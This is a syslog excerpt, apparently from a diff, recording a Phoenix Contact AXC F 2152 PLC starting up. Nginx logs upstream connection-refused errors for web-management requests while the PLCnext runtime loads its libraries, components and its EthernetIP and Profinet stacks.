+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=Syslog&pageName=SyslogConfiguration HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=Um&pageName=UserManager HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=Um&pageName=LdapConfiguration HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/InfoValues.cgi?ordernum HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/module/Spm/SpmDp/GetActivationStatus HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/module/Spm/SpmDp/GetActivationStatus HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/module/Um/UserManagementInfoDp/GetPasswordInfo? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1544#1544: *1595 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/Utilities.cgi?ListTotalWbmLanguagesFiles HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1592 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PlcValues.cgi?projectname HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1592 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/Utilities.cgi?ListTotalWbmLanguagesFiles HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1592 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/Utilities.cgi?ListTotalWbmLanguagesFiles HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1592 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "GET /wbm/IsUserAuthenticationRequired.cgi?_=1724536522723 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1592 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/Utilities.cgi?ListTotalWbmLanguagesFiles HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Login.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1592 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/Utilities.cgi?ListTotalWbmLanguagesFiles HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Login.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1592 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "GET /wbm/IsUserAuthenticationRequired.cgi?_=1724536523692 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Login.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1592 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/Utilities.cgi?ListTotalWbmLanguagesFiles HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Login.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1592 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/SystemUseNotificationGet.cgi?SystemUseNotification HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Login.html"
+Aug 24 23:55:05 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.OpcUAServer.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:05 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.PLCnextStore.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:05 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.ProfiCloudV3.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.SecurityStoreManager.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Spm.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.SpnsProxy.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Syslog.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.SystemEvents.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.TraceController.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Wbm.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Wcm.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.Commons.Services.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.RscGateway.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.Security.Services.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.Um.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.UmRscAuthorizator.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.Watchdog.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - EthernetIPComponent
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.EthernetIP' in process 'ExternalIoProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.PnC' in process 'ExternalIoProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.PnD' in process 'ExternalIoProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.PnS' in process 'ExternalIoProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.DomainProxy@ExternalIoProcess' in process 'ExternalIoProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.UmRscAuthorizator@ExternalIoProcess' in process 'ExternalIoProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.AxlC' in process 'LocalIoProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.DomainProxy@LocalIoProcess' in process 'LocalIoProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.UmRscAuthorizator@LocalIoProcess' in process 'LocalIoProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Device.HmiLed' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Device.Interface' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.DeviceHmi' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.ExternalPci' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.ExternalSDCard' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.FanControl' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.Fpga' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.IdentificationData' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.NetloadLimiter' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.Nim' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.OsControl' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.RealTimeClock' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.ResourceMonitor' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.Sensors' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.FbIo.AxlC' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.FbIo.EthernetIP' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Domain' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.DomainProxy' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Eclr' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Eclr.ArpDomain' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.EclrServices' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Esm' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.EsmController' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Fbm' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Gds' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Manager' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Meta' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.MetaDomain' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Plm' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Retain' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Alarms' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.AppManager' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.DataLogger' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069026336   EhmiComponent 
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Ehmi' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Fwm' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.GrpcLocal' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.LinuxSyslog' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.NmUtilities.NmPlcStateListener' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.NotificationLogger' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.OpcUAServer' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.PLCnextStore' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.ProfiCloudV3' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.SecurityStoreManager' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Spm' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.SpnsProxy' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Syslog' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.SystemEvents' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.TraceController' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.Services.Wbm.Internal.Modules.WbmModuleManager INFO - WBM Modules Manager
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Wbm' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Wcm' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.Commons.Services' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.Lm' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.RscGateway' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.Security.Services' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.Um' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.UmRscAuthorizator' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.Watchdog.MainProcess' in process 'MainProcess' created.
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.Hardware.Modules.IdentificationData.Tpm12.Internal.TpmAccess INFO - TPM data version 2 found (length 180)
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.Hardware.IdentificationData.IdentificationDataComponent INFO - Phoenix Contact, AXC F 2152 (2404267), HW 04, serial=1368735890
+Aug 24 23:55:06 axcf2152 Arp.System.Application: Arp.System.Watchdog.SystemWatchdogComponent INFO - starting SystemWatchdog on process: MainProcess
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Hardware.ExternalSDCard.ExternalSDCardComponent INFO - External SD card de-activation state: activated
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Hardware.ExternalSDCard.ExternalSDCardComponent INFO - External SD card status: CardNotInserted
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Hardware.Fpga.FpgaComponent INFO - FPGA version = 1.1.80
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Hardware.Nim.NimComponent INFO - Ethernet Device 1: public Name 'eth0', name 'LAN 1', MAC A8:74:1D:11:B6:B4, 2 ports, IP=192.168.137.10, subnet mask=255.255.255.0
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Hardware.ResourceMonitor.ResourceMonitorComponent INFO - Number of CPU cores: 2
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Hardware.ResourceMonitor.ResourceMonitorComponent INFO - Partition UserPartition: total=487MB, used=236MB, free=215MB
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Plc.Eclr.Internal.EclrDomain INFO - EclrComponent eclr version 3.4.0.117
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Services.SpnsProxy.Internal.Commons.SpnsProxyDbgFifo INFO - Init(/tmp/tospns, /tmp/fromspns)
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Services.SpnsProxy.Data.PlcSysDiagData INFO - PlcSysDiagData: sd-card is not present
+Aug 24 23:55:07 axcf2152 kernel: [ 7781.732349] 000: splc1000_drv splc1000_drv: no device plugged open failed
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Services.SpnsProxy.Internal.SpnsProxyManager INFO - no splc plugged
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - Initialize
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - SubscribeServices
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - LoadSettings, settingsPath=/etc/plcnext/device/Io/EthernetIP/EthernetIP.settings
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - SetupSettings, startEsdk=true
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - SetupSettings, articleName=AXC F 2152, articleNumber=2404267, serialNumber=1368735890
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 Start threshold=6, esdkLogType=0x000b, nics=all, minConsumingDataRate=10, minProducingDataRate=10, statisticsLogLevel=Debug, statisticsLogInterval=10000, statisticsSampleCountLimit=2000, statisticsStepMinAverage=false, statisticsStepMaxAverage=false, forceLoadAssemblies=false
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 ESDK 0xffff, Start, threshold=6, esdkLogType=0x000b, nics=all, heartBeatID=198, listenOnlyID=199, productType=0x0e, productName=AXC F 2152, serialNumber=1368735890, productCode=8220, timerIntervalMin=1, timerIntervalMax=25
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2906182464 OnNewNetworkLedChange ledState=true.
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2906182464 OnNewNetworkLedChange ledState=false.
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2906182464 OnNewNetworkLedChange ledState=true.
+Aug 24 23:55:07 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.System.Internal.System INFO - PN Version Info: v6.6.11851
+Aug 24 23:55:08 axcf2152 nginx: 2024/08/24 23:55:08 [error] 1543#1543: *1592 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/SystemUseNotificationGet.cgi?SystemUseNotification HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Login.html"
+Aug 24 23:55:08 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.System.Internal.System INFO - ProfinetStack is initialized
+Aug 24 23:55:08 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxioDrvAcc INFO - Open Axio Driver: /dev/axio_xfer0
+Aug 24 23:55:08 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxioConfig INFO - Axioline FW Version: 1.40 from 13.11.19
+Aug 24 23:55:08 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxioDrvAcc INFO - Open Axio Driver: /dev/axio_xfer0
+Aug 24 23:55:09 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.Device.Internal.Device INFO - Device Instance with Id = 1 added successfully.
+Aug 24 23:55:09 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.Controller.Internal.Controller INFO - Controller instance added successfully
+Aug 24 23:55:09 axcf2152 Arp.System.Application: Arp.Device.HmiLed.Internal.LedManager INFO - LedManager: PN-Ctrl at 1
+Aug 24 23:55:09 axcf2152 Arp.System.Application: Arp.Device.HmiLed.Internal.LedManager INFO - LedManager: PN-Dev at 1
+Aug 24 23:55:09 axcf2152 Arp.System.Application: Arp.Device.Interface.Internal.MonitorThreads INFO - Device has Reset-Button
+Aug 24 23:55:09 axcf2152 Arp.System.Application: Arp.Device.Interface.Internal.MonitorThreads INFO - Device support RemovableStorage
+Aug 24 23:55:09 axcf2152 Arp.System.Application: Arp.Device.Interface.Internal.MonitorThreads INFO - HW Monitor active with prio 48
+Aug 24 23:55:09 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - AppManager created
+Aug 24 23:55:10 axcf2152 Arp.System.Application: Arp.Services.Spm.SecurityProfileManager INFO - Security Profile Manager
+Aug 24 23:55:10 axcf2152 Arp.System.Application: Arp.Services.TraceController.TraceControllerComponent INFO - Loading settings from /etc/plcnext/device/Services/TraceController/TraceController.settings
+Aug 24 23:55:10 axcf2152 Arp.System.Application: Arp.Services.Wcm.WebConfigurationManager INFO - Web Configuration Manager
+Aug 24 23:55:10 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069026336   Initialize 
+Aug 24 23:55:10 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069026336   SubscribeServices 
+Aug 24 23:55:10 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069026336   LoadSettings settingsPath=/etc/plcnext/device/Services/Ehmi/ehmi.settings, exists=true
+Aug 24 23:55:10 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 3069026336   Initialize FastcgiConnectionPoint=unix:/var/tmp/ehmi/ehmi.socket
+Aug 24 23:55:10 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 2560664384    Starting ThreadID=2560664384, Name=RcfFastCgiServer, cpuAffinity=0x0001
+Aug 24 23:55:10 axcf2152 Arp.System.Application: Arp.Services.ProfiCloudV3.Internal.ProfiCloudV3Manager ERROR - Failed to subscribe to ISoftwareUpdateService.
+Aug 24 23:55:10 axcf2152 Arp.System.Application: Arp.Services.ProfiCloudV3.Internal.ProfiCloudV3Manager INFO - Publish IProfiCloudV3Service
